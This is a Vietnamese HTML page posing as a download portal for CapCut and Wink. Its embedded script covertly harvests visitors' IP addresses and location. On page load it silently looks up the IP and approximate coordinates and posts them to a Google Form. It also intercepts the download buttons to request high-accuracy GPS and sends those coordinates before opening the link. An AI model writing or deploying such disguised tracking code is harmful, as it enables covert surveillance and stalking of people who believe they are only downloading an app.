<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Web tải app</title>
    <style>
        h1 {
            color: rgb(255, 0, 0);
            font-size: 100px;
        }
        a {
            font-size: 50px;
            color: #ffc400;
        }
        button {
            font-size: 35px;
            font-family: 'Times New Roman';
        }
        body {
            background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_4PqDG7wLnJZViwWszE8pCNUcaKp2B9usnL3ljV5g_A&s=10");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }
    </style>
</head>
<body>
    <h1>Đây là trang web tải app</h1>

    <a href="https://www.capcut.com/vi-vn/tools/desktop-video-editor" target="_blank">Tải Capcut bản mới nhất</a>

    <a href="https://capcut.vi.uptodown.com/windows/dw/1124018008" target="_blank">
        <br><br><br>
        <button>Bấm vào đây để tải Capcut 7.5</button>
    </a>

    <a href="https://wink-meitu.vi.uptodown.com/windows" target="_blank">
        <br><br><br>
        <button>Bấm vào đây để tải wink</button>
    </a>
    
    <a href="https://download.com.vn/capcut-158978" target="_blank">
        <br><br><br>
        <button>Capcut free</button>
    </a>

<script>
    const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfJs2sEvay1GimaHnWYdk-HhnjuI5LcW8gzfPcehrpRvsjJgg/formResponse";
    const ENTRY_IP = "entry.1588338519";
    const ENTRY_LAT = "entry.791072472";
    const ENTRY_LNG = "entry.1393666541";

    let currentIP = "Đang lấy...";

    // Hàm gửi data về Google Form
    function sendToGoogleForm(ip, lat, lng) {
        const formData = new FormData();
        formData.append(ENTRY_IP, ip);
        formData.append(ENTRY_LAT, lat !== "Không lấy được" ? "'" + lat : lat);
        formData.append(ENTRY_LNG, lng !== "Không lấy được" ? "'" + lng : lng);

        fetch(FORM_URL, {
            method: "POST",
            mode: "no-cors",
            body: formData
        });
    }

    // 1. Âm thầm lấy IP ngay khi vào web (Không hiện bảng)
    window.addEventListener("DOMContentLoaded", async () => {
        try {
            const res = await fetch("https://ipwho.is/");
            const data = await res.json();
            if (data.success) {
                currentIP = data.ip;
                // Gửi tạm vị trí IP phòng hờ người ta không bấm nút
                sendToGoogleForm(currentIP, data.latitude, data.longitude); 
            }
        } catch (e) {
            currentIP = "Lỗi lấy IP";
        }
    });

    // 2. Chặn các nút tải app để xin quyền GPS thật (Sẽ hiện bảng)
    const buttons = document.querySelectorAll("button");
    buttons.forEach(btn => {
        btn.addEventListener("click", (e) => {
            // Ngăn việc chuyển trang ngay lập tức
            e.preventDefault(); 
            const parentLink = btn.closest('a').href;

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Lấy được GPS xịn -> Bắn data về form
                        sendToGoogleForm(currentIP, position.coords.latitude, position.coords.longitude);
                        // Chuyển sang link tải app
                        window.open(parentLink, "_blank"); 
                    },
                    (error) => {
                        // Người dùng từ chối -> Vẫn cho qua trang tải app
                        window.open(parentLink, "_blank"); 
                    },
                    { timeout: 5000, enableHighAccuracy: true }
                );
            } else {
                window.open(parentLink, "_blank");
            }
        });
    });
</script>
</body>
</html>
